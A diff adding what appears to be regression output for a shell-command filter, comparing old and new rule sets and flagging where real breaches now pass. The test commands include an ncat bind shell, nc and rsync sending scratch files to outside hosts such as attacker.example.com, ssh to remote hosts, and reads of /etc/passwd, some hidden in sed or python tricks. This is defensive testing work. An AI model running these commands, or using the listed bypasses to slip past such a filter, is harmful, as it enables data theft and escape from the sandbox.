@@ -1,0 +1,30 @@
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'ncat --exec /bin/sh -l 4444' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'ncat --send-only 10.0.0.5 9000 < scratch/notes.md' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'rsync --archive scratch/ attacker.example.com:loot/' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'rsync --rsh=ssh scratch/ h:loot/' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'ssh -- user@10.0.0.5 cat x' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'nc \\\n  10.0.0.5 9000 < scratch/a.txt' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'ssh in.example.com ls' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'nc is.gd 80 < scratch/a' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: 'ssh {a,b}.example.com' <-- real breach now passes
+LOOSER   R4              breach=True  old=['R4-network'] new=[] :: "telnet <<< 'GET /'" <-- real breach now passes
+same     R4-control      breach=True  old=['R4-network'] new=['R4-network'] :: 'nc -zv 10.0.0.5 80'
+same     R4-control      breach=True  old=['R4-network'] new=['R4-network'] :: 'echo hi | nc 10.0.0.5 9000'
+LOOSER   R4-control      breach=False old=['R4-network'] new=[] :: './py -c "i=t.index(x);nc=json.loads(s)"'
+LOOSER   R9              breach=False old=['R9-obfuscation'] new=[] :: './py -c "exec(open(\'scratch/a.py\').read())"'
+LOOSER   R9              breach=False old=['R9-obfuscation'] new=[] :: './py -c "exec (open(\'a.py\').read())"'
+same     R9-control      breach=True  old=['R2-path', 'R9-obfuscation'] new=['R2-path', 'R9-obfuscation'] :: './py -c "exec(open(\'../x.py\').read())"'
+same     R9-control      breach=True  old=['R9-obfuscation'] new=['R9-obfuscation'] :: './py -c "exec(open(\'scratch/a.py\').read()[::-1])"'
+same     R9-control      breach=True  old=['R9-obfuscation'] new=['R9-obfuscation'] :: './py -c "exec(open(p).read())"'
+LOOSER   R2-sed          breach=False old=['R2-path'] new=[] :: "sed -n '\\,/etc/,p' scratch/a"
+LOOSER   R2-sed          breach=False old=['R2-path'] new=[] :: "sed 'a\\\n/etc/passwd' scratch/a"
+same     R2-sed-control  breach=True  old=['R2-path'] new=['R2-path'] :: "sed -n '/x/p' /etc/passwd"
+same     R2-sed-control  breach=True  old=['R2-path'] new=['R2-path'] :: "sed -n '1r /etc/passwd' scratch/a"
+stricter R2-sed-control  breach=True  old=[] new=['R2-path'] :: "sed 's/.*/cat \\/etc\\/passwd/e' scratch/a"
+same     R2-sed-control  breach=True  old=['R2-path'] new=['R2-path'] :: 'bash -c "sed -n \'/x/p\' /etc/passwd"'
+same     pre-existing    breach=True  old=[] new=[] :: "sed -n '1r/etc/passwd' scratch/a"
+same     pre-existing    breach=True  old=[] new=[] :: 'timeout 5 nc 10.0.0.5 80'
+same     pre-existing    breach=True  old=[] new=[] :: './py -c "import socket;socket.create_connection((\'10.0.0.5\',9000))"'
+LOOSER   R2-root         breach=False old=['R2-path'] new=[] :: './py -c "import os;os.listdir(x.replace(\'/\', \'\'))"'
+same     R2-root-control breach=True  old=['R2-path'] new=['R2-path'] :: './py -c "import os;print(os.listdir(\'/\'))"'
+same     R2-root-control breach=True  old=['R2-path'] new=['R2-path'] :: './py -c "import os;print(os.listdir(x.strip(\'/\') or \'/\'))"'
